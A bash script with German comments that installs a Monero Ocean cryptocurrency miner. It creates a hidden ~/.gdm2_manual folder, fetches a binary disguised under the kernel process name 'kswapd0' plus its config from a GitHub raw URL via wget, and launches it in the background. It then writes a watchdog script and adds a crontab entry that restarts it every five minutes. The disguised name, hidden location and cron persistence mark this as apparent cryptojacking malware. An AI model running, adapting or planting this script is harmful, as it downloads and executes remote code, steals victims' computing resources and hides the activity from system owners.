#!/bin/bash

# Skript um Monero Ocean Miner zu starten und Dateien zu verwalten

# Verzeichnis für die Dateien erstellen
mkdir -p "$HOME/.gdm2_manual/"

# Pfade zu den benötigten Dateien
KSWAPD0="$HOME/.gdm2_manual/kswapd0"
CONFIG_JSON="$HOME/.gdm2_manual/config.json"

# Prozesse beenden, die mit dem spezifischen kswapd0 verbunden sind
pkill -f "$KSWAPD0 --config=$CONFIG_JSON"

# Überprüfen, ob die Dateien existieren und herunterladen, falls nicht
if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
    echo "kswapd0 existiert und ist ausführbar."
else
    echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
    chmod +x "$KSWAPD0"
fi

if [ -f "$CONFIG_JSON" ]; then
    echo "config.json existiert."
else
    echo "config.json existiert nicht. Herunterladen..."
    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

# kswapd0 ausführen, wenn kein anderer Prozess mit der spezifischen Konfiguration läuft
if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
    echo "kswapd0 nicht gestartet. Starte es..."
    "$KSWAPD0" --config="$CONFIG_JSON" &
else
    echo "kswapd0 läuft bereits."
fi

# Überprüfungsskript erstellen
cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
#!/bin/bash

KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"

if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
    echo "kswapd0 not started. Going to start it..."
    cd "$HOME/.gdm2_manual/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Überprüfungsskript ausführbar machen
chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"

# Cron-Job einrichten
(crontab -l 2>/dev/null; echo "*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
